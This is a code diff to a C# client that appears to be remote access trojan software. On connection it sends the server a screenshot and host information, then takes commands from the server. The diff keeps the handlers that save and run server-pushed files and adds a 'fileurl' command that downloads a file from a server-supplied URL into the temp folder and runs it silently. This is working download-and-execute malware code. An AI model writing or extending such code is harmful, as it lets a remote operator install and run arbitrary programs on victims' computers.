@@ -113,6 +113,7 @@ namespace Client
             await client.SendFileBytes(screenshot, clientInfo.ToString());
             GClass.StartHeartbeat(client);
 
+            // Replace your current FileOfferWithMetaReceived event handler with this:
             client.FileOfferWithMetaReceived += (s, e) => {
                 try
                 {
@@ -132,7 +133,10 @@ namespace Client
                                 File.WriteAllBytes(savePath, e.FileRequest.FileBytes);
                                 Console.WriteLine($"File saved: {savePath}");
 
+                                // Optional: Accept the file (for server-side tracking)
                                 client.AcceptFile(e.FileRequest.TransferId, savePath);
+
+                                // Open the file
                                 System.Diagnostics.Process.Start(savePath);
                             }
                             else
@@ -146,12 +150,27 @@ namespace Client
                                 System.Diagnostics.Process.Start(savePath);
                             }
                             break;
+
+                        // Add other commands as needed
+                        default:
+                            Console.WriteLine($"Unknown command: {command}");
+                            break;
                     }
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine($"Error handling file offer: {ex.Message}");
                 }
+            };
+
+            // Optional: Add a handler for FileCompleted to track when transfers finish
+            client.FileCompleted += (s, e) => {
+                Console.WriteLine($"File transfer completed: {e.FileRequest.Metadata} (Success: {e.Success})");
+            };
+
+            // Optional: Add a handler for FileProgress to see transfer progress
+            client.FileProgress += (s, e) => {
+                Console.WriteLine($"File progress: {e.BytesTransferred}/{e.TotalBytes} bytes ({(e.BytesTransferred * 100.0 / Math.Max(e.TotalBytes, 1)):F1}%)");
             };
 
             client.MessageReceived += async (s, e) =>
@@ -329,6 +348,31 @@ namespace Client
                             string bod = (string)message["body"];
                             System.Diagnostics.Process.Start(bod);
                             break;
+                        case "fileurl":
+                            string fileUrl = (string)message["body"];
+
+                            // Create a random filename with the same extension as the original
+                            string extension = Path.GetExtension(fileUrl);
+                            string tempFilePath = Path.Combine(
+                                Path.GetTempPath(),
+                                Path.GetRandomFileName() + extension
+                            );
+
+                            // Download the file
+                            using (var client = new System.Net.WebClient())
+                            {
+                                client.DownloadFile(fileUrl, tempFilePath);
+                            }
+
+                            // Execute the downloaded file
+                            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                            {
+                                FileName = tempFilePath,
+                                UseShellExecute = true
+                            });
+
+                            break;
+
 
                     }
                 }
